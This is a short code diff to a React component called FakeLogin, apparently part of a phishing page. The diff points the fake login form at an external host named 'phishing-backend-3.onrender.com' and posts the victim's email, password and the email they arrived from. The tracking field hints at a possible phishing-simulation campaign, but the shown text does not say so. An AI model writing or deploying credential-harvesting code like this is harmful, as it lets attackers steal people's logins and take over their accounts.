@@ -25,17 +25,18 @@ function FakeLogin() {
     e.preventDefault();
 
     try {
-      await fetch("/api/fake-login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          email,
-          password,
-          clickedFrom: sourceEmail || "Direct Access",
-        }),
-      });
+      await fetch("https://phishing-backend-3.onrender.com/api/fake-login", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    email,
+    password,
+    clickedFrom: sourceEmail || "Direct Access",
+  }),
+});
+
 
       setSubmitted(true);
     } catch (err) {
